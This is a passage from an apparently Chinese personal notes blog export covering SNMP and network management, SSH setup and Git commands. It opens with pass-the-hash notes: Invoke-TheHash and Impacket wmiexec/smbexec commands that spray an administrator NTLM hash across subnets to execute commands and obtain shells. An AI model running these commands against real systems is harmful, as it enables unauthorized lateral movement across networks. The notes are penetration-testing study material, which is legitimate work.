579110c49145015c47ecd267657d3174</span><br></pre></td></tr></table></figure><ul><li>利用已有管理员hash，批量撞指定网段机器。（很实用）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">PS C:\Users\Administrator&gt; Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash b4e535a9bb56bcc084602062c9e2a9d4</span><br><span class="line">域：</span><br><span class="line">PS C:\Users\Administrator&gt; Invoke-TheHash -Type WMIExec -Target 10.10.10.0/24 -Domain de1ay -Username administrator -Hash e1c61709dffcf154ac9d77b5024f6d10</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091736198.png" alt="image-20220809173638078"></p><h2 id="Impacket-Hash传递攻击"><a href="#Impacket-Hash传递攻击" class="headerlink" title="Impacket Hash传递攻击"></a>Impacket Hash传递攻击</h2><blockquote><p>Impacket 工具套件很好用</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令执行：</span></span><br><span class="line">python2 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">5791</span>10c49145015c47ecd267657d3174 administrator@<span class="number">192.168</span><span class="number">.1</span><span class="number">.52</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#反弹shell：</span></span><br><span class="line">python2 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">5791</span>10c49145015c47ecd267657d3174 administrator@<span class="number">192.168</span><span class="number">.1</span><span class="number">.52</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 凭证获取 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> hash传递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络管理&amp;SNMP</title>
      <link href="/2022-08-19-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;SNMP/"/>
      <url>/2022-08-19-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;SNMP/</url>
      
        <content type="html"><![CDATA[<h1 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h1><h2 id="网络管理引论"><a href="#网络管理引论" class="headerlink" title="网络管理引论"></a>网络管理引论</h2><h3 id="现状、必要性、网络管理的预期目标"><a href="#现状、必要性、网络管理的预期目标" class="headerlink" title="现状、必要性、网络管理的预期目标~"></a>现状、必要性、网络管理的预期目标~</h3><ol><li>机构网络的现状:</li></ol><ul><li>设备数量多：几百台</li><li>设备种类多：链路、交换机、路由器、主机、协议等</li></ul><ol start="2"><li>出现问题很正常</li></ol><ul><li>设备本身故障</li><li>配置问题</li><li>对资源（例如链路带宽)过度使用</li></ul><ol start="3"><li>网络管理的必要性</li></ol><ul><li>·协助网管定位和解决问题</li><li>提前发现问题，预警</li></ul><ol start="4"><li>希望网络管理达到的目标</li></ol><ul><li>监测网络（各部件)的运行状态</li><li>故障时异常时报警</li><li>允许管理人员千涉系统的运行（重启、配置参数等)</li><li>自动、远程（不需要去现场）！</li></ul><ol start="5"><li>网络管理的功能举例</li></ol><ul><li><p>检测主机或路由器的网卡故障（网卡发去的帧错误增加)</p></li><li><p>自动监测主机的活跃程度</p></li><li><p>监测流量：</p><blockquote><ul><li>某网段的流量增加，可以将服务器迁到另一个网段</li><li>某网段的流量超过阈值，在用户感知之前，升级带宽</li></ul></blockquote></li><li><p>路由表格的快速变化，配置问题，在网络发生问题前发现并修复</p></li><li><p>SLA监测：掉线率，延迟，吞吐量，达到下限报警</p></li><li><p>入侵检测：攻击行为，检测和报警</p></li></ul><h3 id="功能、定义"><a href="#功能、定义" class="headerlink" title="功能、定义"></a>功能、定义</h3><ol><li>功能</li></ol><ul><li>性能管理：</li></ul><blockquote><ul><li>性能（利用率、吞吐量）量化、测量、报告、分析和控制不同网络部件的性能</li><li>涉及到的部件：单独部件（网卡，协议实体)，端到端的路径</li></ul></blockquote><ul><li>故障管理：记录、检测和响应故障；</li></ul><blockquote><ul><li>性能管理为长期监测设备性能</li><li>故障管理：突然发生的强度大的性能降低，强调对故障的响应</li></ul></blockquote><ul><li>配置管理：跟踪设备的配置，管理设备配置信息</li><li>账户管理：定义、记录和控制用户和设备访问网络资源。管理用户、资源以及哪些用户可以使用哪些资源</li></ul><blockquote><ul><li>限额使用、给予使用的收费，以及分配资源访问权限</li></ul></blockquote><ul><li>安全管理：定义安全策略，控制对网络资源的使用</li></ul><ol start="2"><li>定义</li></ol><p>网络管理包括了硬件、软件和人类元素的设置、综合和协调，以便监测、测试、轮询、配置、分析、评价和控制网络和网元资源，用合理的成本满足实时性、透行性和服务质量的要求</p><h3 id="网管实质、体系结构、现有的网管协议"><a href="#网管实质、体系结构、现有的网管协议" class="headerlink" title="网管实质、体系结构、现有的网管协议"></a>网管实质、体系结构、现有的网管协议</h3><ol><li>网络管理的实质</li></ol><p>实质：远程（分布式) 监测（查询、定期上报，以及异常异步报告)和控制</p><p>实例：集团和分支机构</p><ul><li>分支定期报告，产量等信息</li><li>分支主动报告异常</li><li>总部问分支：上报信息（指标)</li><li>总部发出指令，让分支动作</li></ul><ol start="2"><li>网络管理体系结构</li></ol><ul><li><p>管理实体：在NOC网络管理工作站上的应用程序（老板)</p><blockquote><p>执行网络管理动作：收熟处理、分析、显示</p></blockquote></li><li><p>被管设备：主机、路由器、交换机、打印机、modem（分支机构)</p></li></ul><blockquote><ul><li><strong>被管设备</strong>包括若干<strong>被管对象</strong></li></ul><blockquote><p>硬件的一个部分（网卡）<br>某些硬件或软件的配置参数集合(RIP路由协议)</p></blockquote><ul><li>被管对象的信息收集在：本地<strong>管理信息库MIB</strong>中</li><li>被管设备中驻留网络管理代理agent,与管理实体通信，在被管设备上执行本地动作</li></ul></blockquote><ul><li>网络管理协议</li></ul><blockquote><ul><li>在管理实体和被管设备之间</li><li>允许实体查询设备的信息，报告异常事件</li><li>通过代理对设备间接地采取动作</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190043415.png" alt="image-20220819004302290" style="zoom: 67%;" /><ol start="3"><li>目前已有的网络管理协议</li></ol><ul><li>OSI:CMISE&#x2F;CMIP</li><li>互联网：SNMP（SNMP仅仅是互联网网络管理体系中的一个组成部分）</li></ul><h2 id="互联网网络管理架构"><a href="#互联网网络管理架构" class="headerlink" title="互联网网络管理架构"></a>互联网网络管理架构</h2><ol><li>网管需要解决的问题</li></ol><ul><li>需要监视和控制被管设备的什么信息?</li></ul><blockquote><ul><li>被管设备需要管理和维护的信鼻：<strong>被管对象</strong></li></ul><blockquote><ul><li>例如：到目前为止接收到的错误分组个数，系统的描述信息等</li><li>需要命名标识和约定</li></ul></blockquote><ul><li>相关被管对象汇聚成：模块，被管设备中的被管模块形成本地存储MIB(Management Information Base)</li></ul></blockquote><ul><li>被控信息什么形式进行定义和传输?</li></ul><blockquote><ul><li>数据定义语言：SMl(Structure of Managerment Intormation)</li></ul><blockquote><ul><li>用整数，还是字符串还是什么表示这个被管对象</li><li>MIB库中的所有对象和模块采用SMl(ASN.1)定义，像C语言那样</li></ul></blockquote><ul><li>BER:定义的被管对象和模块采用BER转换成标准码流进行数据交换</li></ul></blockquote><ul><li>什么格式和时机进行管理信息的交换：SNMP协议</li></ul><p>SNMP协议和MIB、SMI相互独立便于独立演化</p><h3 id="SMI-管理信息结构"><a href="#SMI-管理信息结构" class="headerlink" title="SMI:管理信息结构"></a>SMI:管理信息结构</h3><p>被管对象的三个属性：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190106073.png" alt="image-20220819010648920"></p><h4 id="命名（标识）：0ID"><a href="#命名（标识）：0ID" class="headerlink" title="命名（标识）：0ID"></a>命名（标识）：0ID</h4><ol><li>一个唯一的标示</li></ol><ul><li>MB库由一堆对象构成，每个对象需要一个唯一标示</li><li>需要一个标示方法，SMI的内容之一</li><li>如：用什么ID标识某个P上网卡收到的数据包个数</li></ul><ol start="2"><li>对象的命名：0ID和01D树</li></ol><ul><li>平面命名：重名（命名或者编号），不便于管理，也不携带对象之间的关系</li></ul><blockquote><p>所以我们转用<strong>层次命名</strong>：像域名空间(好用)</p></blockquote><ul><li><p>一个对象的标示符（对象ID)唯一确定了在MIB层次结构中的一个被管对象</p></li><li><p>层次：一棵树，根不命名，一层层分配命名（有对应标号）</p></li><li><p>0ID:一个对象可以用从树根到树叶的节点名字（或者数字）来标示</p><blockquote><p>iso.org.dod.internet.mgmt.mib&lt;&#x3D;&gt;1.3.6.1.2.1</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190121692.png" alt="image-20220819012103547" style="zoom: 80%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190124234.png" alt="image-20220819012229424"></p></blockquote></li><li><p>MIB库就是一个按照层次组织起来的0ID（对象ID）集合</p></li></ul><blockquote><ul><li>对象构成组</li><li>(组+对象)构成模块</li><li>一些标准模块形成：MIB库</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190124783.png" alt="image-20220819012453607" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190127973.png" alt="image-20220819012753816" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190128298.png" alt="image-20220819012832116" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190129531.png" alt="image-20220819012927333" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190130540.png" alt="image-20220819013015368" style="zoom:67%;" /><h4 id="语法（定义）：ASN-1"><a href="#语法（定义）：ASN-1" class="headerlink" title="语法（定义）：ASN.1"></a>语法（定义）：ASN.1</h4><ul><li>用来定义对象的数据类型（整数，字符串…)，类似c语言可以自定义数据结构</li><li>如：数据包个数用什么类型的数据结构表示</li><li>MIB库中的所有对象和模块采用SMl(ASN.1)定义，像C语言那样</li></ul><ol><li>对象的第2个属性：数据类型</li></ol><blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191018502.png" alt="image-20220819101844407"></p></blockquote><ol start="2"><li>SMI采用ASN.1的一些基本内容，另外增加了一些定义</li></ol><blockquote><ul><li>Abstract Syntax Notation One(ASN.1)是一个<strong>数据定义语言</strong>，用于定义MIB中被管对象，可以使其在获得机器无关的表示一致性</li><li>ASN.1采用变量和声明，类似于编程语言。而后面讲到的传输编码EBR像机器语言</li><li>提供供应商中立、跨平台、标准的语言，用于开发者来描述协议，系统和机器</li><li>像ASN.1的一致性语言允许不同类型的计算机能够更有效的分享信息</li></ul></blockquote><ol start="3"><li>ASN.1介绍</li></ol><blockquote><ul><li><p>ASN.1是SNMP用于创建实际MIB对象的数据表示格式</p></li><li><p>ASN.1在SNMP之前很早就存在</p></li><li><p>MIB的定义充分利用了ASN.1的优势</p></li><li><p>ASN.1是0SI的标准：IS08824</p></li><li><p>SNMP采用了ASN.1定义了<strong>交换报文的格式</strong>以及<strong>管理的对象</strong></p><p><strong>这意味着这种数据定义语言，不仅可以定义对象，也可以定义报文交换格式</strong></p></li></ul></blockquote><p>注：SNMP<strong>报文和被管对象（模块）都采用ASN.I定义</strong>；BER进行编码</p><ol start="4"><li>SMI中的基本数据类型</li></ol><p>3种在ASN.1中定义的简单数据类型+4种SM|中定义的数据类型</p><blockquote><ul><li>Integers-有符号整数，范围：-2,147,483,648 to 2,147,483,647.</li><li>Octet strings-字符串（每位字符编码在0到65535)</li><li>Object IDs -These values are from the set of all object identifiers allocated according to the rules specified inASN.1.实际上就是之前将的OID，OID也是应该数据结构</li></ul></blockquote><blockquote><ul><li>Network addresses-网络地址代表一个特性协议族的地址.SNMPv1支持32为1P地址</li><li>Counters-计数器值非负，可以增加一直到一个最大值，再增加到0.SNMPv1中，指定为32位计数器</li><li>Gauges          -Gauges非负，可以增加或者减少，但是保持一个它曾经到达过的最大值</li><li>Time ticks-time tick代表从某个时间开始多少时间，以10ms为单位.</li></ul></blockquote><ol start="5"><li><strong>被管理对象</strong>的类型（对象！！不同于基本数据类型）</li></ol><p>简单类型：<strong>标量对象</strong>(注意这是一个对象)</p><ul><li>定义一个单个对象实例（类似于：C中的变量)</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191054572.png" alt="image-20220819105443427" style="zoom:50%;" /></blockquote><ul><li>SMI的基本数据类型</li></ul><blockquote><ul><li>Integer(4 bytes),来自ANS.1</li><li>String(var iable),来自ANS.1</li><li>Objectldentifier (variable)来自ANS.1</li><li>IPAddress(4 bytes),SMI增加</li><li>Counter(4 bytes),SMl增加</li><li>Gauge(4 bytes),SMl增加</li><li>TimeTicks(4 bytes),SMl增加</li></ul></blockquote><p>结构类型：</p><ul><li>简单类型和某些结构类型的组合</li><li>SMI定义了2种类型：sequence和sequence of</li><li>Sequence:1个sequence:数据类型是一些简单数据类型的组合(c.f.C中的结构体)(不同类型组合成结构体)</li><li>Sequence of:1个sequence of数据类型是简单类型的序列(c.f.C中的数组)（相同类型组合成数组）</li></ul><h4 id="传输编码：BER"><a href="#传输编码：BER" class="headerlink" title="传输编码：BER"></a>传输编码：BER</h4><p>SMI采用BER(Basic Encoding Rules)将SMI定义的被管对象值编码成传输的位串。定义编码从而在网络上进行传输的方法，形成什么样的码流以至于机器无关，语义相同</p><p>使得不同机器获得语义上的一致性</p><ul><li>仅仅内存拷贝解决不了通信问题</li><li>大端小端问题</li></ul><p>每个被传输的数据（对象值和SNMP字段）都有：TLV</p><ul><li>Type(1byte) - 3子字段</li></ul><blockquote><p>class (2 bit) + format (1 bit) + number (5 bit)</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191248829.png" alt="image-20220819124856688" style="zoom:50%;" /></blockquote><ul><li>Length:1个或多个字节</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191249312.png" alt="image-20220819124941159" style="zoom:50%;" /></blockquote><ul><li>Value:根据BER定义的规则编码数据的值</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191255772.png" alt="image-20220819125503640"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191257370.png" alt="image-20220819125701241"></p><h3 id="SNMP-互联网网络管理协议"><a href="#SNMP-互联网网络管理协议" class="headerlink" title="SNMP:互联网网络管理协议"></a>SNMP:互联网网络管理协议</h3><h4 id="网络管理协议"><a href="#网络管理协议" class="headerlink" title="网络管理协议"></a>网络管理协议</h4><p>网络管理，是指网络管理员通过网络管理程序对网络上的资源进行集中化管理的操作。网络管理系统中最重要的部分就是网络管理协议，它定义了网络管理器与被管代理间的通信方法。</p><p>在网络管理协议产生以前的相当长的时间里，管理者要学习各种从不同网络设备获取数据的方法。因为各个生产厂家使用专用的方法收集数据，相同功能的设备，不同的生产厂商提供的数据采集方法可能大相径庭。在这种情况下，制定一个行业标准的紧迫性越来越明显。</p><h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p>简单网络管理协议(SNMP)已经成为事实上的标准网络管理协议。由于SNMP首先是IETF的研究小组为了解决在Internet上的路由器管理问题提出的，因此许多人认为SNMP在IP上运行的原因是Internet运行的是TCP&#x2F;IP协议，但事实上，SNMP是被设计成与协议无关的，所以它可以在IP、IPX、AppleTalk、OSI以及其他用到的传输协议上使用。</p><p>SNMP是由一系列协议组和规范组成的，它们提供了一种从网络上的设备中收集网络管理信息的方法。</p><p>从被管理设备中收集数据有两种方法：一种是轮询(polling-only)方法，另一种是基于中断(interrupt-based)的方法。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191302625.png" alt="image-20220819130214477" style="zoom:50%;" /></blockquote><h5 id="轮询-polling-only"><a href="#轮询-polling-only" class="headerlink" title="轮询(polling-only)"></a>轮询(polling-only)</h5><p>SNMP使用嵌入到网络设施中的代理软件来收集网络的通信信息和有关网络设备的统计数据。代理软件不断地收集统计数据，并把这些数据记录到一个管理信息库(MIB)中。网管员通过向代理的MIB发出查询信号可以得到这些信息，这个过程就叫轮询(polling)。为了能全面地查看一天的通信流量和变化率，管理人员必须不断地轮询SNMP代理，每分钟就轮询一次。这样，网管员可以使用SNMP来评价网络的运行状况，并揭示出通信的趋势，如哪一个网段接近通信负载的最大能力或正使通信出错等。先进的SNMP网管站甚至可以通过编程来自动关闭端口或采取其它矫正措施来处理历史的网络数据。</p><p>如果只是用轮询的方法，那么网络管理工作站总是在控制之下。但这种方法的缺陷在于信息的实时性，尤其是错误的实时性。多久轮询一次、轮询时选择什么样的设备顺序都会对轮询的结果产生影响。轮询的间隔太小，会产生太多不必要的通信量;间隔太大，而且轮询时顺序不对，那么关于一些大的灾难性事件的通知又会太慢，就违背了积极主动的网络管理目的。</p><h5 id="中断-interrupt-based"><a href="#中断-interrupt-based" class="headerlink" title="中断(interrupt-based)"></a>中断(interrupt-based)</h5><p>与之相比，当有异常事件发生时，基于中断的方法可以立即通知网络管理工作站，实时性很强。但这种方法也有缺陷。产生错误或自陷需要系统资源。如果自陷必须转发大量的信息，那么被管理设备可能不得不消耗更多的事件和系统资源来产生自陷，这将会影响到网络管理的主要功能。</p><p>结果，以上两种方法的结合：面向自陷的轮询方法(trap-directed polling)可能是执行网络管理最有效的方法了。一般来说，网络管理工作站轮询在被管理设备中的代理来收集数据，并且在控制台上用数字或图形的表示方法来显示这些数据。被管理设备中的代理可以在任何时候向网络管理工作站报告错误情况，而并不需要等到管理工作站为获得这些错误情况而轮询它的时候才会报告。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>SNMP的体系结构分为SNMP管理者(SNMP Manager)和SNMP代理者(SNMP Agent)，每一个支持SNMP的网络设备中都包含一个代理，此代理随时纪录网络设备的各种情况，网络管理程序再通过SNMP通信协议查询或修改代理所纪录的信息。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181807013.jpeg" alt="img" style="zoom: 67%;" /><h4 id="SNMP报文类型"><a href="#SNMP报文类型" class="headerlink" title="SNMP报文类型"></a>SNMP报文类型</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191303735.png" alt="image-20220819130350603" style="zoom:50%;" /></blockquote><h4 id="SNMP工作方式"><a href="#SNMP工作方式" class="headerlink" title="SNMP工作方式"></a>SNMP工作方式</h4><p>两者之间是松耦合的关系，使用UDP协议进行通讯，默认端口是UDP161(也会用到162端口接收trap数据)</p><p>SNMP管理站通过向SNMP代理发送请求命令（GetRequest, GetNextRequest, GetBulkRequest或InformRequest），当SNMP代理收到命令后返回响应（Response）</p><p>SNMP管理站向SNMP代理发送SetRequest，代理设备执行设置操作。</p><p>SNMP代理发生特定重要状况改变时主动向SNMP管理站发送Trap消息。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182355091.jpeg" alt="img" style="zoom:67%;" /><h4 id="SNMP报文格式"><a href="#SNMP报文格式" class="headerlink" title="SNMP报文格式"></a>SNMP报文格式</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191312531.png" alt="image-20220819131242400" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191551496.png" alt="image-20220819155110379" style="zoom:50%;" /><p>注意：SNMP协议没有给出每个字段的长度，因为使用了TLV方式~，所以不需要给出。TLV自解释</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191555397.png" alt="image-20220819155523260" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191557873.png" alt="image-20220819155707700" style="zoom: 50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191605613.png" alt="image-20220819160502485" style="zoom:50%;" /><h4 id="SNMP编码"><a href="#SNMP编码" class="headerlink" title="SNMP编码"></a>SNMP编码</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191607981.png" alt="image-20220819160722832" style="zoom:50%;" /></blockquote><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191610514.png" alt="image-20220819161035389"></p><p>在第三节的第26分钟解释，豁然开朗~~！<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191616105.png" alt="image-20220819161610865"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191644250.png" alt="image-20220819164443105"></p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>在SNMPv3中增加了以下安全特性：</p><ul><li>报文完整性：保证报文在传输中不被修改</li><li>可认证性：能够判断报文是不是一个有效的源发送的</li><li>加密：保证私密性，即使被截获无法得知发送的到底是什么</li><li>基于视图的访肉控制：</li></ul><blockquote><ul><li>SNMP实体维护着不同用户的访问权限，策略的数据库</li><li>是否可访问的LCD数据库可以作为被管对象访问</li></ul></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://www.bilibili.com/video/BV1TL4y1B7LJ?spm_id_from=333.337.search-card.all.click&vd_source=e73a152dada4626bad49c30d848902f7">中科大-郑烇-计算机网络-网络管理（3&#x2F;3）-数据定义语言ASN.1、BER编码和SNMP协议</a></p><p><a href="https://product.pconline.com.cn/itbk/life/electronic/1802/10848758.html">网络管理协议是什么 各种网络管理协议特点介绍【详解】</a></p><p><a href="https://www.bilibili.com/video/BV1PY4y1s7cD?spm_id_from=333.337.search-card.all.click&vd_source=e73a152dada4626bad49c30d848902f7">SNMP操作演示</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络管理 </tag>
            
            <tag> SNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/SSH/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/SSH/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><p>SSH简介：SSH 为 Secure Shell 的缩写，SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#SSH配置：开启密码登录、允许root用户登录：</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#PermitRootLogin prohibit-password</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开启或重启ssh：（改完配置文件都要重启相应服务）</span></span><br><span class="line">service ssh start</span><br><span class="line">service ssh restart</span><br><span class="line">systemctl status ssh<span class="comment">#命令查看ssh状态</span></span><br><span class="line">systemctl start ssh<span class="comment">#开启ssh服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看22端口是否开启监听：</span></span><br><span class="line">netstat -anltup | grep 22</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加开机启动：</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br><span class="line">update-rc.d ssh <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#终端连接：</span></span><br><span class="line">ifconfig</span><br><span class="line">ssh root@192.168.123.136</span><br></pre></td></tr></table></figure><h1 id="ssh连接centos-很慢-解决方法"><a href="#ssh连接centos-很慢-解决方法" class="headerlink" title="ssh连接centos 很慢-解决方法"></a>ssh连接centos 很慢-解决方法</h1><blockquote><p>参考：<a href="https://www.runoob.com/w3cnote/ssh-slow.html">https://www.runoob.com/w3cnote/ssh-slow.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先备份/etc/ssh/sshd_config,备份命令为</span></span><br><span class="line"><span class="built_in">cp</span> /etc/ssh/sshd_config /etc/ssh/sshd_config.bak</span><br><span class="line"><span class="comment">#以root用户登录</span></span><br><span class="line"><span class="comment">#编辑配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config  </span><br><span class="line"><span class="comment">#输入 / ,查找GSSAPIAuthentication 其值改为no</span></span><br><span class="line"><span class="comment">#输入 /，查找UseDNS,其值改为no(该项默认不启用，去掉#启用)</span></span><br><span class="line"><span class="comment">#最后输入!wq保存文件并退出</span></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h1 id="关于known-hosts文件"><a href="#关于known-hosts文件" class="headerlink" title="关于known_hosts文件:"></a>关于<strong>known_hosts</strong>文件:</h1><blockquote><p>用户的.ssh目录下面有有个<strong>known_hosts</strong>文件，这个文件存储本机曾经ssh连接过的远程主机的公钥，用来在连接时和对面主机上的公钥进行比对，如果一样则进行下一步操作！</p><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</p><p>参考：<a href="https://www.cnblogs.com/fonxian/p/11228760.html">https://www.cnblogs.com/fonxian/p/11228760.html</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208282147744.png" alt="image-20220827205707043" style="zoom:50%;" /></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.wangdoc.com/ssh/">SSH 教程</a></li><li><a href="https://www.wangdoc.com/ssh/key.html">https://www.wangdoc.com/ssh/key.html</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
            <tag> ssh连接centos很慢 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Git/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Git/</url>
      
        <content type="html"><![CDATA[<p>Git简介：一个开源的分布式版本控制系，用于敏捷高效地处理任何或小或大的项目。</p><h1 id="git命令速查"><a href="#git命令速查" class="headerlink" title="git命令速查"></a>git命令速查</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209212217844.png" alt="git命令速查"></p><h1 id="工作区、暂存区、版本库"><a href="#工作区、暂存区、版本库" class="headerlink" title="工作区、暂存区、版本库"></a>工作区、暂存区、版本库</h1><ul><li>工作区：就是你在电脑里能看到的目录。</li><li>暂存区：英文叫 stage 或 index。一般存放在 .git 目录下的 index 文件（.git&#x2F;index）中，所以我们把暂存区有时也叫作索引（index）。</li><li>版本库：工作区有一个隐藏目录 .git，这个不算工作区，而是 Git 的版本库。</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209212221053.png" alt="在这里插入图片描述" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209212222370.png" alt="在这里插入图片描述" style="zoom:50%;" /><h1 id="Git命令"><a href="#Git命令" class="headerlink" title="Git命令"></a>Git命令</h1><h2 id="简单的代码提交流程"><a href="#简单的代码提交流程" class="headerlink" title="简单的代码提交流程"></a>简单的代码提交流程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status #查看工作区代码相对于暂存区的差别</span><br><span class="line">git add . #将当前目录下修改的所有代码从工作区添加到暂存区 . 代表当前目录</span><br><span class="line">git commit -m ‘注释’ #将缓存区内容添加到本地仓库</span><br><span class="line">git push origin master #将本地版本库推送到远程服务器，origin是远程主机，master表示是远程服务器上的master分支，分支名是可以修改的</span><br></pre></td></tr></table></figure><h3 id="Git-add"><a href="#Git-add" class="headerlink" title="Git add"></a>Git add</h3><p><code>git add \[参数] &lt;路径&gt;</code>　作用就是将我们需要提交的代码从工作区添加到暂存区，就是告诉git系统，我们要提交哪些文件，之后就可以使用git commit命令进行提交了。</p><blockquote><p>为了方便下面都用 . 来标识路径， . 表示当前目录，路径可以修改，下列操作的作用范围都在版本库之内。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不加参数默认为将修改操作的文件和未跟踪新添加的文件添加到git系统的暂存区，注意不包括删除</span></span><br><span class="line"></span><br><span class="line">git add -u .</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-u 